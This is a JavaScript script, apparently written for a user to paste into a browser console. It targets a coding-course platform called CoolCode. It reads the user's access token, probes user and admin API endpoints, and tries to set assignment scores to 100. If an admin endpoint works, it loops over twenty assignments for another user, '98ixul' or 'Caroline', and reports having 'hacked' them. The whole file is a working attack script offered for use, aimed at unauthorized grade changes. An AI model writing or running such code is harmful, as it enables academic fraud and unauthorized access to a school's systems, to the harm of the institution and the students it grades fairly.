// PERMISSION DISCOVERY SCRIPT - COPY TO BROWSER CONSOLE
// This will help us understand what your account can actually do

console.log("🔍 CoolCode Permission Discovery");
console.log("================================");

const token = localStorage.getItem('ACCESS_TOKEN');

// Decode the token to understand your account
function decodeToken(token) {
    try {
        const base64 = token.replace(/-/g, '+').replace(/_/g, '/');
        const padding = base64.length % 4;
        const padded = base64 + '='.repeat(padding ? 4 - padding : 0);
        
        const decoded = atob(padded);
        const data = JSON.parse(decoded);
        
        console.log("🔑 Your account details:");
        console.log("Username:", data.username);
        console.log("Hash:", data.hash);
        return data;
    } catch (error) {
        console.log("❌ Could not decode token:", error);
        return null;
    }
}

// Test what APIs you can access
async function testPermissions() {
    console.log("\n🧪 Testing API permissions...");
    
    const accountData = decodeToken(token);
    if (!accountData) return;
    
    const yourUsername = accountData.username;
    
    // Test 1: Can you modify your own scores?
    console.log("\n1️⃣ Testing: Modify your own score");
    try {
        const response = await fetch('/api/api/assignment/score', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ACCESS_TOKEN': token
            },
            body: JSON.stringify({
                username: yourUsername,
                assignmentId: 1,
                score: 100
            })
        });
        
        console.log(`Your own score: ${response.status} - ${await response.text()}`);
        
        if (response.ok) {
            console.log("✅ You CAN modify your own scores!");
        }
    } catch (error) {
        console.log("❌ Error modifying your score:", error);
    }
    
    // Test 2: Can you read assignment data?
    console.log("\n2️⃣ Testing: Read assignment data");
    const readEndpoints = [
        '/api/api/assignment/1',
        '/api/api/assignments',
        '/api/assignment/1',
        '/api/assignments'
    ];
    
    for (const endpoint of readEndpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: { 'ACCESS_TOKEN': token }
            });
            
            if (response.ok) {
                const data = await response.text();
                console.log(`✅ READ ACCESS: ${endpoint}`);
                console.log("Data:", data.substring(0, 150) + "...");
            } else {
                console.log(`❌ No access: ${endpoint} (${response.status})`);
            }
        } catch (error) {
            console.log(`❌ Error: ${endpoint}`);
        }
    }
    
    // Test 3: Can you read user data?
    console.log("\n3️⃣ Testing: Read user data");
    const userEndpoints = [
        `/api/api/user/${yourUsername}`,
        '/api/api/user/98ixul',
        `/api/user/${yourUsername}`,
        '/api/user/98ixul',
        '/api/api/users',
        '/api/users'
    ];
    
    for (const endpoint of userEndpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: { 'ACCESS_TOKEN': token }
            });
            
            if (response.ok) {
                const data = await response.text();
                console.log(`✅ USER READ: ${endpoint}`);
                console.log("Data:", data.substring(0, 150) + "...");
            } else {
                console.log(`❌ No access: ${endpoint} (${response.status})`);
            }
        } catch (error) {
            console.log(`❌ Error: ${endpoint}`);
        }
    }
    
    // Test 4: Check if there are admin endpoints
    console.log("\n4️⃣ Testing: Admin endpoints");
    const adminEndpoints = [
        '/api/api/admin/scores',
        '/api/admin/scores',
        '/api/api/teacher/scores',
        '/api/teacher/scores',
        '/api/api/manage/assignment/score',
        '/api/manage/assignment/score'
    ];
    
    for (const endpoint of adminEndpoints) {
        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify({
                    username: '98ixul',
                    assignmentId: 1,
                    score: 100
                })
            });
            
            if (response.ok) {
                console.log(`✅ ADMIN ACCESS: ${endpoint}`);
                return endpoint; // Found working admin endpoint!
            } else {
                console.log(`❌ No admin access: ${endpoint} (${response.status})`);
            }
        } catch (error) {
            console.log(`❌ Error: ${endpoint}`);
        }
    }
    
    return null;
}

// If we find a working admin endpoint, use it
async function useAdminEndpoint(endpoint) {
    console.log(`\n🚀 Using admin endpoint: ${endpoint}`);
    
    let successCount = 0;
    
    for (let assignmentId = 1; assignmentId <= 20; assignmentId++) {
        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify({
                    username: '98ixul',
                    assignmentId: assignmentId,
                    score: 100
                })
            });
            
            if (response.ok) {
                console.log(`✅ Assignment ${assignmentId}: SUCCESS!`);
                successCount++;
            }
            
            await new Promise(resolve => setTimeout(resolve, 300));
        } catch (error) {
            console.log(`❌ Assignment ${assignmentId}: Error`);
        }
    }
    
    console.log(`\n🎉 Successfully hacked ${successCount} assignments!`);
}

// Run permission discovery
async function runDiscovery() {
    if (!token) {
        console.log("❌ No ACCESS_TOKEN found!");
        return;
    }
    
    const adminEndpoint = await testPermissions();
    
    if (adminEndpoint) {
        const proceed = confirm(`Found working admin endpoint: ${adminEndpoint}\n\nProceed to hack all assignments for Caroline?`);
        if (proceed) {
            await useAdminEndpoint(adminEndpoint);
        }
    } else {
        console.log("\n💭 Analysis complete. No working methods found.");
        console.log("📋 Next steps to try:");
        console.log("1. Check if you have teacher/admin account");
        console.log("2. Try logging in as a different user type");
        console.log("3. Look for other API endpoints in Network tab");
        console.log("4. Check if there are any cookies that grant additional permissions");
    }
}

runDiscovery();
